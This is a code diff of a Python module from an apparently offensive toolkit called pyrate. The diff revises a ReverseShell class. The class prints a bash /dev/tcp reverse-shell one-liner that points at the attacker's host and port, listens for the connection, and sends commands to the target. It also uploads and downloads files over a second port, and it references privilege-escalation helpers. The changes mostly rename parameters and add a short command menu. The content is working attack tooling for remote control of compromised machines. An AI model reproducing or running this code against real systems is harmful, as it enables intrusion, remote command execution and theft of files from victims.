@@ -7,14 +7,14 @@ from pyrate.file_transfer import FileTransfer
 from pyrate.privilege_escalation import PrivilegeEscalation
 
 class ReverseShell:
-    def __init__(self, host_ip, host_port, target_ip):
-        self.host_ip = host_ip
-        self.host_port = host_port
-        self.target_ip = target_ip
-        self.simple_reverse_shell_bash = 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'.format(ip=host_ip, port=host_port)
+    def __init__(self, lhost, lport, rhost):
+        self.lhost = lhost
+        self.lport = lport
+        self.rhost = rhost
+        self.simple_reverse_shell_bash = 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'.format(ip=lhost, port=lport)
         self.cli = CLI()
         self.cli.cli_print(self.simple_reverse_shell_bash)
-        self.listener = PortListener(host_ip, host_port)
+        self.listener = PortListener(lhost, lport)
         self.running = True
 
     def handle_initial_data(self):
@@ -23,10 +23,13 @@ class ReverseShell:
 
     def main_loop(self):
         self.handle_initial_data()
+        print('type q to quit')
         while self.running:
+            self.cli.prompt_text = '$ '
             new_command = self.cli.cli_prompt()
             new_command = self.handle_command(new_command)
-            self.run_command_and_print(new_command)
+            if (new_command):
+                self.run_command_and_print(new_command)
 
     def run_command_and_print(self, command):
         return_value = self.listener.send_receive(command)
@@ -34,21 +37,31 @@ class ReverseShell:
         return return_value
 
     def handle_command(self, command):
-        if command.lower() in ['bye']:
+        if command.lower() in ['q']:
             self.running = False
             return ''
-        if command.lower() == 'runfile':
-            self.commands_from_local_file('/tmp/escalate')
+        elif command.lower() == 'h':
+            print('actions: [r]un, [u]pload, [d]ownload, [h]elp')
             return ''
-        if command.lower() == 'fileupload':
-            self.send_file('/tmp/escalate', '/tmp/escalate')
+        elif command.lower() == 'r':
+            arg = input('run file commands: <src> ')
+            self.commands_from_local_file(arg)
             return ''
-        if command.lower() == 'filedownload':
-            self.receive_file('/tmp/escalate', '/tmp/escalate')
+        elif command.lower() == 'u':
+            args = input('upload file: <src> <dest> ')
+            args = args.split(' ')
+            self.send_file(args[0], args[1])
             return ''
-        if command.lower() == 'privesc':
-            self.search_for_privesc()
+        # TODO
+        elif command.lower() == 'd':
+            print('not implemented')
+        #    args = input('download file: <src> <dest> ')
+        #    args = args.split(' ')
+        #    self.receive_file(args[0], args[1])
             return ''
+        #elif command.lower() == 'privesc':
+        #    self.search_for_privesc()
+        #    return ''
         return command + '\n'
 
     def commands_from_local_file(self, local_file):
@@ -57,14 +70,14 @@ class ReverseShell:
                 return_value = self.listener.send_receive(line)
                 self.cli.cli_print(return_value)
 
-    def send_file(self, source_file_path, destination_file_path):
-        file_transfer = FileTransfer(self.host_ip, self.host_port + 1, self)
-        file_transfer.host_to_target(source_file_path, destination_file_path)
+    def send_file(self, src, dest):
+        file_transfer = FileTransfer(self.lhost, self.lport + 1, self)
+        file_transfer.host_to_target(src, dest)
         file_transfer.close()
 
-    def receive_file(self, source_file_path, destination_file_path):
-        file_transfer = FileTransfer(self.host_ip, self.host_port + 1, self)
-        file_transfer.target_to_host(source_file_path, destination_file_path)
+    def receive_file(self, src, dest):
+        file_transfer = FileTransfer(self.lhost, self.lport + 1, self)
+        file_transfer.target_to_host(src, dest)
         file_transfer.close()
 
     def search_for_privesc(self):
